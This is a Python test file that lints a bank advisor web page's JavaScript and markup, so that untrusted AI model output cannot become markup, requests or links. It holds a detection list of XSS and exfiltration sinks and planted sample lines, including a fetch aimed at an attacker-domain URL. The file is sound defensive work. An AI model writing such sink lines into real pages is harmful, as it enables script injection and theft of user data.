"""The advisor page, read without a browser (M1 PR 11): the two assets it loads, the
markup's shape, and a scan of app.js for the sinks that would turn model output into
markup, a request or a link.

The page renders untrusted model output (threat model, path 1): the image and link
exfiltration paths run through it. The browser half is tests/web/test_answer.py. The
scan is a lint over our own code, not a proof: it reads the text, so a sink reached
through a computed property name (`el[name] = value`) is reported only because the
scan also refuses computed member assignment.
"""

from __future__ import annotations

import html
import re
from dataclasses import replace
from html.parser import HTMLParser
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.config import branding
from app.config.settings import Settings
from app.main import create_app, index_html

STATIC = Path(__file__).resolve().parents[1] / "app" / "web" / "static"
SCRIPT = "/static/app.js"
STYLE = "/static/app.css"
# Written out here, not imported, so that a change in the app shows up as a failure.
ASSETS = {SCRIPT: ("app.js", "text/javascript"), STYLE: ("app.css", "text/css")}
MAX_QUESTION = 2000

# Elements the page itself may contain. No link, image, frame, embed, base or inline
# style anywhere; one script, from the page's own origin.
ALLOWED_ELEMENTS = frozenset(
    {
        "html", "head", "meta", "title", "link", "script", "body", "main", "header",
        "h1", "h2", "p", "form", "label", "textarea", "button", "section", "div",
        "ol", "dl", "dt", "dd", "span",
    }
)  # fmt: skip
# Elements app.js may create. The text of each is set through textContent.
CREATED_ELEMENTS = frozenset({"li", "span"})


class Page(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.elements: list[tuple[str, dict[str, str | None]]] = []
        self.text_in: dict[str, str] = {}
        self._open: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.elements.append((tag, dict(attrs)))
        self._open.append(tag)

    def handle_endtag(self, tag: str) -> None:
        if tag in self._open:
            del self._open[len(self._open) - 1 - self._open[::-1].index(tag) :]

    def handle_data(self, data: str) -> None:
        if self._open:
            tag = self._open[-1]
            self.text_in[tag] = self.text_in.get(tag, "") + data

    def all(self, tag: str) -> list[dict[str, str | None]]:
        return [attrs for name, attrs in self.elements if name == tag]


def parse(markup: str) -> Page:
    page = Page()
    page.feed(markup)
    page.close()
    return page


@pytest.fixture
def client(settings: Settings) -> TestClient:
    return TestClient(create_app(settings), base_url="http://127.0.0.1:8000")


# --- the assets ---------------------------------------------------------------------


@pytest.mark.parametrize("path", sorted(ASSETS))
def test_assets_are_served(client: TestClient, path: str) -> None:
    name, media_type = ASSETS[path]
    response = client.get(path)
    assert response.status_code == 200, f"{path}: {response.status_code}"
    assert response.headers["content-type"] == f"{media_type}; charset=utf-8", response.headers
    assert response.content == (STATIC / name).read_bytes()
    assert response.content.strip(), f"{name} is empty"
    # The page's headers: the CSP, and nosniff, under which a browser runs a script only
    # with a script content type.
    assert "script-src 'self'" in response.headers["content-security-policy"]
    assert response.headers["x-content-type-options"] == "nosniff"


@pytest.mark.parametrize("method", ["HEAD", "POST", "PUT", "DELETE"])
@pytest.mark.parametrize("path", sorted(ASSETS))
def test_assets_answer_get_only(client: TestClient, path: str, method: str) -> None:
    response = client.request(method, path)
    assert response.status_code == 405, f"{method} {path}: {response.status_code}"


@pytest.mark.parametrize(
    "path",
    [
        "/static/index.html",
        "/static/app.js.map",
        "/static/APP.JS",
        "/static/app.js/",
        # A literal ".." is removed by httpx before sending; the encoded form arrives.
        "/static/%2e%2e/main.py",
        "/static/%2E%2E/app/main.py",
        "/static/",
    ],
)
def test_nothing_else_under_static(client: TestClient, path: str) -> None:
    # Two exact routes, no directory mount: nothing else in the package is served.
    response = client.get(path)
    assert response.status_code == 404, f"{path}: {response.status_code}"


# --- the markup ---------------------------------------------------------------------


def test_page_loads_its_own_assets_only() -> None:
    page = parse(index_html())
    tags = {tag for tag, _ in page.elements}
    assert tags <= ALLOWED_ELEMENTS, f"unexpected elements: {sorted(tags - ALLOWED_ELEMENTS)}"
    scripts = page.all("script")
    assert scripts == [{"src": SCRIPT, "defer": None}], scripts
    assert page.text_in.get("script", "").strip() == "", "inline script"
    links = page.all("link")
    assert links == [{"rel": "stylesheet", "href": STYLE}], links
    for tag, attrs in page.elements:
        for name, value in attrs.items():
            assert not name.startswith("on"), f"<{tag} {name}>: an inline handler"
            assert name != "style", f"<{tag} style>: an inline style"
            assert "//" not in (value or ""), f"<{tag} {name}={value!r}>: an absolute URL"
        if tag == "meta":
            assert "http-equiv" not in attrs, f"<meta {attrs}>"


def test_page_takes_its_names_from_branding() -> None:
    markup = index_html()
    page = parse(markup)
    title = f"{branding.PRODUCT.name} — {branding.BANK.display_name}"
    assert page.text_in.get("title") == title
    assert page.text_in.get("h1") == title
    assert html.escape(branding.PRODUCT.tagline) in markup
    assert "{{" not in markup, "a placeholder was not filled in"


def test_page_escapes_branding_in_one_pass(monkeypatch: pytest.MonkeyPatch) -> None:
    # Branding is trusted, but the page treats it as text: escaped, and filled in one
    # pass, so a placeholder inside a value is never expanded again.
    monkeypatch.setattr(
        branding, "PRODUCT", replace(branding.PRODUCT, name='<b x="1">&{{tagline}}')
    )
    monkeypatch.setattr(branding, "BANK", replace(branding.BANK, display_name="<i>"))
    monkeypatch.setattr(branding, "PRODUCT", replace(branding.PRODUCT, tagline="</p><script>"))
    markup = index_html()
    title = "&lt;b x=&quot;1&quot;&gt;&amp;{{tagline}} — &lt;i&gt;"
    assert f"<title>{title}</title>" in markup, markup[:400]
    assert f"<h1>{title}</h1>" in markup
    assert "&lt;/p&gt;&lt;script&gt;" in markup
    assert "<script>" not in markup and "<b " not in markup and "<i>" not in markup


def test_question_box_sends_nothing_without_the_script() -> None:
    # Without app.js a submitted form would put its named fields into a URL. The box has
    # no name, so a native submit carries no question; the form posts nowhere else.
    page = parse(index_html())
    [form] = page.all("form")
    assert "action" not in form and "method" not in form, form
    [box] = page.all("textarea")
    assert "name" not in box, box
    assert box.get("maxlength") == str(MAX_QUESTION), box
    assert box.get("id") == "question", box
    # What the advisor types names clients: no enhanced spell check sends it to a vendor,
    # and the browser keeps no autofill history of it (review sec-5).
    assert box.get("spellcheck") == "false", box
    assert box.get("autocomplete") == "off", box


def test_grounding_wording() -> None:
    # The number guard proves provenance, not truth (threat model, path 7; PR 9 sec-9).
    for name in ("index.html", "app.js"):
        text = (STATIC / name).read_text(encoding="utf-8")
        assert not re.search(r"verif", text, re.IGNORECASE), f"{name} says 'verified'"


# --- the sink scan ------------------------------------------------------------------

# Each rule is a way from a string to markup, a request, a navigation, a new resource,
# code, or a member reached by a computed name. app.js uses none of them. Only whole-line
# `//` comments are left out: a line that starts with them holds no code. Block comments
# are refused rather than stripped, since a regex cannot tell `/*` in a string from one
# that opens a comment (review sec-4). Known limits: the word rules also match inside
# string literals (a message saying "a new question" trips `new`: loud, not silent); a
# line of a multi-line template literal that starts with `//` is skipped (it is string
# content, not code); element traversal (`closest`, `parentElement`) is not refused, so
# the property rules carry that path.
SINKS = {
    "innerHTML": r"\binnerHTML\b",
    "outerHTML": r"\bouterHTML\b",
    "insertAdjacentHTML": r"\binsertAdjacent(?:HTML|Element)\b",
    "setHTML": r"\b(?:setHTML|setHTMLUnsafe|parseHTMLUnsafe)\b",
    "createContextualFragment": r"\bcreateContextualFragment\b",
    "DOMParser": r"\bDOMParser\b",
    "srcdoc": r"\bsrcdoc\b",
    "write": r"\bwrite(?:ln)?\b",
    "eval": r"\beval\b",
    "Function": r"\bFunction\b",
    "constructor": r"\bconstructor\b",
    "timer": r"\bset(?:Timeout|Interval)\s*\(\s*(?!\([^()]*\)\s*=>|[A-Za-z_$][\w$]*\s*=>|function\b)",
    "setAttribute": r"\bsetAttribute(?:NS)?\b",
    "attribute node": r"\b(?:createAttribute|setAttributeNode|attributes)\b",
    "url property": r"\.(?:src|srcset|href|poster|ping|action|formAction|background|codebase)\b",
    "codeBase": r"\bcodeBase\b",
    "navigation": r"\.(?:submit|click)\s*\(",
    "object URL": r"\b(?:URL|Blob|createObjectURL)\b",
    "new": r"\bnew\b",
    "import": r"\bimport\b",
    "open": r"\bopen\s*\(",
    "location": r"\blocation\b",
    "history": r"\bhistory\b",
    "XMLHttpRequest": r"\bXMLHttpRequest\b",
    "navigator": r"\bnavigator\b",
    "WebSocket": r"\bWebSocket\b",
    "EventSource": r"\bEventSource\b",
    "postMessage": r"\bpostMessage\b",
    "importScripts": r"\bimportScripts\b",
    "style": r"\.style\b",
    "cssText": r"\bcssText\b",
    "stylesheet": r"\b(?:CSSStyleSheet|insertRule|replaceSync|adoptedStyleSheets)\b",
    "createElementNS": r"\bcreateElementNS\b",
    "cookie": r"\bcookie\b",
    "global object": r"\b(?:window|self|globalThis|top|parent|frames|opener)\b",
    "defaultView": r"\b(?:defaultView|ownerDocument)\b",
    "document member": r"\bdocument\s*(?:\[|\.\s*(?!(?:getElementById|createElement)\b))",
    "Object write": r"\bObject\s*\.\s*(?:assign|defineProperty|defineProperties|setPrototypeOf)\b",
    "Reflect": r"\bReflect\b",
    "string key": r"\[\s*[\"'`]",
    "computed assignment": r"\]\s*(?:(?:[-+*/%&|^]|\?\?|\*\*|<<|>>>?|&&|\|\|)?=(?!=)|\+\+|--)",
    "computed call": r"\]\s*(?:\?\.\s*)?(?:\(|\.\s*(?:call|apply|bind)\b)",
    "fetch alias": r"\bfetch\b(?!\s*\()",
    "createElement alias": r"\bcreateElement\b(?!\s*\()",
    "unicode escape": r"\\u",
    "block comment": r"/\*",
}
CREATE_ELEMENT = re.compile(r"\bcreateElement\s*\(\s*(?:\"([a-z]+)\"|'([a-z]+)'|([^)]*))\)")
FETCH = re.compile(r"\bfetch\s*\(\s*([^,)]*)")
LINE_COMMENT = re.compile(r"^\s*//.*$", re.MULTILINE)


def code(source: str) -> str:
    """The source without whole-line comments. A trailing comment stays, and is
    scanned: the rule errs towards reporting."""
    return LINE_COMMENT.sub("", source)


def scan(source: str) -> list[str]:
    body = code(source)
    found = [f"{name}: {m.group(0)!r}" for name, p in SINKS.items() for m in re.finditer(p, body)]
    for match in CREATE_ELEMENT.finditer(body):
        tag = match.group(1) or match.group(2)
        if tag not in CREATED_ELEMENTS:
            found.append(f"createElement tag: {match.group(0)!r}")
    for match in FETCH.finditer(body):
        if match.group(1).strip() != "ASK":
            found.append(f"fetch target: {match.group(0)!r}")
    if re.search(r"\bASK\b", body) and not re.search(r"\bconst ASK = \"/api/ask\";", body):
        found.append("ASK constant: not /api/ask")
    return found


ATTACKER_URL = f"https://{branding.DOMAINS.attacker}/"
# One planted shape per rule; the test asserts that rule, by name, reports it, so a
# deleted or broken pattern turns red even where another rule also matches.
PLANTED = [
    ("innerHTML", "out.innerHTML = data.answer;"),
    ("outerHTML", "out.outerHTML = x;"),
    ("insertAdjacentHTML", "out.insertAdjacentHTML('beforeend', x);"),
    ("insertAdjacentHTML", "out.insertAdjacentElement('beforeend', x);"),
    ("setHTML", "el.setHTML(x);"),
    ("setHTML", "el.setHTMLUnsafe(x);"),
    ("createContextualFragment", "range.createContextualFragment(x);"),
    ("DOMParser", "DOMParser.parseFromString(x, 'text/html');"),
    ("srcdoc", "frame.srcdoc = x;"),
    ("write", "doc.write(x);"),
    ("write", "doc.writeln(x);"),
    ("eval", "eval(x);"),
    ("eval", "(0, eval)(x);"),
    ("eval", "eval?.(x);"),
    ("Function", "Function(x)();"),
    ("constructor", "x.constructor.constructor(y)();"),
    ("timer", "setTimeout('go()', 1);"),
    ("timer", "setInterval(data.code, 1);"),
    ("timer", 'setTimeout(("go()"), 1);'),
    ("timer", "setTimeout(async () => go(), 1);"),
    ("setAttribute", "el.setAttribute('href', x);"),
    ("setAttribute", "el.setAttributeNS(null, 'src', x);"),
    ("attribute node", "el.setAttributeNode(attr);"),
    ("attribute node", "el.attributes.src.value = x;"),
    ("url property", "img.src = x;"),
    ("url property", "img.srcset = x;"),
    ("url property", "a.href = x;"),
    ("url property", "a.ping = x;"),
    ("url property", "video.poster = x;"),
    ("url property", "form.action = x;"),
    ("url property", "button.formAction = x;"),
    ("url property", "body.background = x;"),
    ("codeBase", "applet.codeBase = x;"),
    ("navigation", "form.submit();"),
    ("navigation", "a.click();"),
    ("object URL", "URL.createObjectURL(b);"),
    ("object URL", "const b = Blob;"),
    ("new", "const i = new Image();"),
    ("new", "new Audio(x);"),
    ("new", "new Request(x);"),
    ("new", "new Worker(x);"),
    ("import", "import(x);"),
    ("open", "open(x);"),
    ("location", "location = x;"),
    ("history", "history.pushState({}, '', x);"),
    ("XMLHttpRequest", "const r = XMLHttpRequest;"),
    ("navigator", "navigator.sendBeacon(x, y);"),
    ("navigator", "navigator.serviceWorker.register(x);"),
    ("WebSocket", "const w = WebSocket;"),
    ("EventSource", "const e = EventSource;"),
    ("postMessage", "port.postMessage(x, '*');"),
    ("importScripts", "importScripts(x);"),
    ("style", "el.style.backgroundImage = x;"),
    ("cssText", "decl.cssText = x;"),
    ("stylesheet", "sheet.insertRule(x);"),
    ("stylesheet", "sheet.replaceSync(x);"),
    ("stylesheet", "doc.adoptedStyleSheets = [x];"),
    ("createElementNS", "doc.createElementNS(ns, 'svg');"),
    ("cookie", "const c = doc.cookie;"),
    ("global object", "window.x = 1;"),
    ("global object", "globalThis.fetch(x);"),
    ("global object", "self.addEventListener('message', f);"),
    ("defaultView", "el.ownerDocument.body;"),
    ("document member", "document.body.append(x);"),
    ("document member", "document['write'](x);"),
    ("Object write", "Object.assign(el, { src: x });"),
    ("Object write", "Object.defineProperty(el, k, d);"),
    ("Reflect", "Reflect.set(el, k, x);"),
    ("string key", "el['inner' + 'HTML'] = x;"),
    ("computed assignment", "el[name] = x;"),
    ("computed assignment", "el[name] += x;"),
    ("computed assignment", "el[name] ??= x;"),
    ("computed assignment", "el[name]++;"),
    ("computed call", "el[name](x);"),
    ("computed call", "el[name]?.(x);"),
    ("computed call", "el[k].call(el, 'src', x);"),
    ("computed call", "el[k].apply(el, args);"),
    ("fetch alias", "const f = fetch; f(x);"),
    ("fetch alias", "fetch.call(null, x);"),
    ("createElement alias", "const c = document.createElement.bind(document);"),
    ("unicode escape", "el.\\u0069nnerHTML = x;"),
    ("block comment", 'const a = "/*"; out.innerHTML = x; const b = "*/";'),
    ("block comment", "/* el.innerHTML = x; */"),
    ("createElement tag", "document.createElement('img');"),
    ("createElement tag", 'document.createElement("a");'),
    ("createElement tag", "document.createElement(tag);"),
    ("fetch target", "fetch(x);"),
    ("fetch target", "fetch('/api/ask', {});"),
    ("ASK constant", f'const ASK = "{ATTACKER_URL}";\nfetch(ASK, {{}});'),
    ("innerHTML", "out.innerHTML = x; // a trailing comment does not hide it"),
]


@pytest.mark.parametrize(("rule", "planted"), PLANTED)
def test_scan_reports_a_planted_sink(rule: str, planted: str) -> None:
    found = scan(planted)
    assert any(line.startswith(f"{rule}: ") for line in found), f"{rule} missed: {found}"


def test_every_rule_has_a_planted_shape() -> None:
    planted = {rule for rule, _ in PLANTED}
    rules = set(SINKS) | {"createElement tag", "fetch target", "ASK constant"}
    assert rules == planted, sorted(rules ^ planted)


@pytest.mark.parametrize(
    "allowed",
    [
        "// innerHTML is never used here",
        "  // nor document.write(x)",
        "out.textContent = data.answer;",
        "document.getElementById('answer').textContent = x;",
        "document.createElement('li');",
        'document.createElement("span");',
        'const ASK = "/api/ask";\nfetch(ASK, { method: "POST" });',
        "if (a[0] === b) {}",
        "const label = KINDS[item.kind];",
        "setTimeout(() => go(), 1);",
        "setTimeout((a) => go(a), 1);",
        "setTimeout(function () {}, 1);",
        "byId('ask').requestSubmit();",
        "Object.hasOwn(STOPS, x) && Object.freeze({});",
    ],
)
def test_scan_passes_the_allowed_shapes(allowed: str) -> None:
    assert scan(allowed) == [], scan(allowed)


def test_app_js_has_no_sink() -> None:
    source = (STATIC / "app.js").read_text(encoding="utf-8")
    body = code(source)
    # Non-vacuity: the scan reads the real script, which renders through textContent,
    # creates its list items, and asks through exactly one fetch of the constant.
    assert len(re.findall(r"\.textContent\s*=", body)) >= 8, "the script renders nothing"
    assert len(FETCH.findall(body)) == 1, FETCH.findall(body)
    assert {m.group(1) or m.group(2) for m in CREATE_ELEMENT.finditer(body)} == CREATED_ELEMENTS
    assert scan(source) == [], "\n".join(scan(source))


def test_app_css_loads_nothing() -> None:
    # A stylesheet can fetch too: url(), @import and image-set() are refused.
    css = (STATIC / "app.css").read_text(encoding="utf-8")
    assert css.strip(), "app.css is empty"
    assert not re.search(r"url\s*\(|@import|image-set|@font-face", css, re.IGNORECASE), css
